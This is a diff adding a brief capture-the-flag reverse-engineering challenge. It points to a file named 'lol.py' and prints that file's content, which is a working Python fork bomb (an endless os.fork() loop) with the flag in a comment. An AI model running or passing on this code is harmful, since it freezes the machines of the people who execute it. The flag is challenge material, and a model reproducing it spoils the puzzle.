@@ -1,0 +1,20 @@
+Reverse Engineering 100
+
+It's really easy and you don't have to overthink about the depth of this challenge.
+just open the "utils.pyc" on the hex editor and you would be able to solve this challenge.
+
+--
+
+
+http://kchung.co/lol.py
+
+=>
+
+
+import os
+while True:
+    try:
+        os.fork()
+    except:
+        os.system('start')
+# flag{trust_is_risky}
